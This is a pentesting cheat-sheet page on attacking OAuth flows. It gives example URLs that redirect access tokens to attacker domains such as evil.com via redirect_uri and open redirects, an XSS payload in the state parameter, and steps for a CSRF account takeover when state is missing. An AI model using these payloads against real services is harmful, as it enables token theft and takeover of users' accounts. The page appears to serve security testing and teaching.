---
title: "0Auth Authentication"
draft: false
images: []
description: "Pentesting 0Auth"
lead: "Pentesting 0Auth"
menu:
  docs:
    parent: "Wapp"
weight: 100
toc: true
---

## Grabbing OAuth Token via redirect_uri
Redirect to a controlled domain to get the access token
```
https://www.example.com/signin/authorize?[...]&redirect_uri=https://demo.example.com/loginsuccessful
https://www.example.com/signin/authorize?[...]&redirect_uri=https://localhost.evil.com
```
Redirect to an accepted Open URL in to get the access token
```
https://www.example.com/oauth20_authorize.srf?[...]&redirect_uri=https://accounts.google.com/BackToAuthSubTarget?next=https://evil.com
```
### Executing XSS via redirect_uri
```
https://example.com/oauth/v1/authorize?[...]&redirect_uri=data%3Atext%2Fhtml%2Ca&state=<script>alert('XSS')</script>
```
### Improper handling of state parameter
This is by far the most common issue I see in OAuth implementations. Very often, the state parameter is completely omitted or used in the wrong way. If a state parameter is nonexistent, or a static value that never changes, the OAuth flow will very likely be vulnerable to CSRF. Sometimes, even if there is a state parameter, the application might not do any validation of the parameter and an attack will work. The way to exploit this would be to go through the authorization process on your own account, and pause right after authorizing. You will then come across a request such as:
```
https://yourtweetreader.com?code=asd91j3jd91j92j1j9d1
```
After you receive this request, you can then drop the request because these codes are typically one-time use. You can then send this URL to a logged-in user, and it will add your account to their account. At first, this might not sound very sensitive since you are simply adding your account to a victim’s account. However, many OAuth implementations are for sign-in purposes, so if you can add your Google account which is used for logging in, you could potentially perform an Account Takeover with a single click as logging in with your Google account would give you access to the victim’s account.